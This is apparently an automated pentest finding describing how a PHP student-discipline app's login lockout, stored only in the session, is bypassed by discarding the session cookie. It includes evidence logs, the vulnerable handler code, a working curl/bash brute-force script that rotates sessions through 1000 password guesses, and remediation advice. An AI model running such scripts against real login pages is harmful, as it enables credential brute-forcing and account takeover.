# Login brute-force lockout is per-session only and bypassed by discarding the session cookie

**ID:** vuln-0002
**Severity:** CRITICAL
**Found:** 2026-09-21 14:33:16 UTC
**Target:** http://172.17.112.1:8001
**Endpoint:** /action/login
**CWE:** CWE-307
**CVSS:** 9.1
**Fix Effort:** Medium

## Description

The login brute-force protection (5 failed attempts → 15-minute lock) is stored exclusively in the PHP session. Discarding the session cookie (obtaining a fresh `PHPSESSID`) resets the counter to zero, so the lockout can be bypassed indefinitely and provides no effective limit on password guessing.

## Evidence

Lockout confirmed (5 failures, then blocked on the 6th) within a single session:

```
attempt 1 -> Location: /login | Invalid username or password
attempt 2 -> Location: /login | Invalid username or password
attempt 3 -> Location: /login | Invalid username or password
attempt 4 -> Location: /login | Invalid username or password
attempt 5 -> Location: /login | Invalid username or password
attempt 6 -> Location: /login | Terlalu banyak percobaan gagal. Coba lagi beberapa menit.
```

Bypass — the counter resets with a brand-new session, and a valid login succeeds from a fresh session while the original session remains locked:

```
Session A (5 failures) then attempt 6      -> blocked (Terlalu banyak percobaan gagal)
Session B (new PHPSESSID), attempt 1       -> Invalid username or password (counter reset)
Session C (new PHPSESSID), VALID login     -> 302 Location: /pelanggaran  (lock bypassed)
```

Rotating `X-Forwarded-For` with a fixed session has no effect (the throttle is session-scoped, not IP-scoped):

```
5 failures with X-Forwarded-For: 10.0.0.1..5, then attempt 6 with XFF 10.0.0.99
-> Terlalu banyak percobaan gagal (session counter, XFF ignored)
```

Throughput with session rotation — 10 attempts, no lockout ever triggered; each response was the ordinary "Invalid username or password" rather than the throttle message:

```
for i in $(seq 1 10); do
  rm -f jar; curl -s -c jar $T/login -o page
  TK=$(grep -oP 'name="csrf_token" value="\K[^"]+' page|head -1)
  curl -s -o /dev/null -b jar -X POST $T/action/login \
    --data-urlencode "csrf_token=$TK" --data-urlencode "user_type=nim" \
    --data-urlencode "username=2341238901" --data-urlencode "password=guess$i"
done
# all 10 accepted as normal failures; no throttle message
```

Whitebox corroboration: the only throttle state lives in `$_SESSION` and is unset on any successful login, and the audit log table (`SECURITY_AUDIT_LOG`) is write-only — nothing enforces a limit from it:

## Impact

The account lockout provides no protection against password guessing. An attacker can submit unlimited login attempts by simply discarding the session cookie between requests, achieving credential brute force / password spraying against any account. Because the identifiers (NIM/NIDN/NIP) and default/lab passwords are weak and predictable, an attacker can realistically recover valid student, lecturer, or administrator credentials, leading to unauthorized access to student-discipline records and, for the administrator account, the full administrative surface.

## Technical Analysis

The login handler tracks failures and the lock expiry entirely in the PHP session:

```php title=request/handler-login.php startLineNumber=16 endLineNumber=38
        // per-session throttle (session dies w/ idle expiry). Add an IP-keyed store if deployed open-internet.
        if ((int) ($_SESSION['__login_until'] ?? 0) > time()) {
            set_app_flash_modal('error', 'Terlalu banyak percobaan gagal. Coba lagi beberapa menit.');
            app_redirect('views/auth/login.php');
        }
        ...
        if (!$user->login($username, $password, $userType)) {
            app_audit_log('login_fail', ['actor_id' => substr($username, 0, 32)]);
            $_SESSION['__login_fails'] = (int) ($_SESSION['__login_fails'] ?? 0) + 1;
            if ($_SESSION['__login_fails'] >= 5) {
                $_SESSION['__login_until'] = time() + 900;
                unset($_SESSION['__login_fails']);
                app_audit_log('login_locked', ['actor_id' => substr($username, 0, 32)]);
            }
            set_app_flash_modal('error', 'Invalid username or password.');
            app_redirect('views/auth/login.php');
        }
```

Both `__login_fails` and `__login_until` are session variables. The session identifier is issued by the server but chosen by the client on each request; an attacker who does not return the `PHPSESSID` cookie receives a brand-new session with an empty counter. The `$_SESSION['__login_until']` guard is therefore only effective against a naive client that reuses its cookie. The code comment itself notes the limitation ("Add an IP-keyed store if deployed open-internet"), and `controllers/UserController.php` clears the counters on the first successful login (`unset($_SESSION['csrf_token'], $_SESSION['__login_fails'], $_SESSION['__login_until'])`), so logout/login cycling also resets state. No IP-keyed or global counter exists anywhere in `request/`, `controllers/`, or `models/`; the `SECURITY_AUDIT_LOG` table records failures but nothing reads it to enforce a limit. PHP's per-session file lock serializes concurrent requests that share a session (so a same-session burst still reaches the lock), but independent sessions are processed in parallel with no cap.

## Proof of Concept

1. Attempt 5 invalid logins from a single session (same `PHPSESSID`): each returns `302` → `/login`. On the 6th attempt the response body carries the message "Terlalu banyak percobaan gagal. Coba lagi beberapa menit." and login is refused.
2. Discard the cookie jar (or use a new `PHPSESSID`) and attempt a login again. The counter is reset — the first attempt from the new session returns the ordinary "Invalid username or password" (no throttle), proving the lock is bound to the session and not the account, IP, or server.
3. Repeat step 2 in a loop, rotating sessions, to perform unlimited password guessing — a valid credential returns `302` → the role dashboard (e.g. `/pelanggaran`).
4. Confirm `X-Forwarded-For` rotation is irrelevant (the lock is session-scoped), and that a concurrent burst from a single session is serialized (PHP session lock) while independent sessions run without any cap.

```bash
T=http://172.17.112.1:8001

attempt() {                       # $1 = cookie jar, $2 = password
  curl -s -c "$1" "$T/login" -o /tmp/p.html
  TK=$(grep -oP 'name="csrf_token" value="\K[^"]+' /tmp/p.html | head -1)
  curl -s -o /dev/null -b "$1" -c "$1" -X POST "$T/action/login" \
    --data-urlencode "csrf_token=$TK" --data-urlencode "user_type=nim" \
    --data-urlencode "username=2341238901" --data-urlencode "password=$2"
}

# --- 1) Confirm the lock within one session ---
rm -f /tmp/locked.jar
for i in $(seq 1 6); do attempt /tmp/locked.jar "bad$i"; done
curl -s -b /tmp/locked.jar "$T/login" | grep -o 'Terlalu banyak[^<]*'
#   -> Terlalu banyak percobaan gagal. Coba lagi beberapa menit.

# --- 2) Bypass: rotate the session, keep guessing ---
for i in $(seq 1 1000); do
  JAR=/tmp/rotate_$i.jar
  rm -f "$JAR"
  attempt "$JAR" "guess$i"          # fresh PHPSESSID each time -> counter never reaches 5
done
# --- 3) A valid password from a fresh session logs straight in ---
rm -f /tmp/ok.jar
curl -s -c /tmp/ok.jar "$T/login" -o /tmp/p.html
TK=$(grep -oP 'name="csrf_token" value="\K[^"]+' /tmp/p.html | head -1)
curl -s -i -b /tmp/ok.jar -X POST "$T/action/login" \
  --data-urlencode "csrf_token=$TK" --data-urlencode "user_type=nim" \
  --data-urlencode "username=2341238901" --data-urlencode "password=password123" \
  | grep -i '^Location'
#   -> Location: /pelanggaran
```

## Remediation

Store the failed-attempt counter and lock state server-side, keyed on an attribute the client cannot reset — the source IP address, the attempted account identifier, or both — rather than in `$_SESSION`. Record each failed attempt in a durable store (the existing `SECURITY_AUDIT_LOG` table already captures event, actor_id, sid, and ip) and enforce the 5-attempts/15-minute rule by querying recent failures for the client IP and/or identifier, not the session. Additionally: apply a small constant delay or use a per-IP global counter to slow distributed guessing; add a CAPTCHA or progressive delay after repeated failures; and alert or temporarily disable the targeted account after a threshold. Because reverse-proxy headers (`X-Forwarded-For`) are client-controllable, derive the client IP from the trusted peer address or a correctly configured trusted-proxy list. Ensure the lock applies to the account/IP even when the attacker rotates session cookies.

## Assumptions

Assumes the target is reachable directly by the attacker (confirmed) and that session identifiers are attacker-controlled (i.e., the attacker can simply not send a cookie). No account lockout, CAPTCHA, or IP allow/deny exists to compensate. The credential set is small (numeric NIM/NIDN/NIP), so offline wordlists are highly effective.
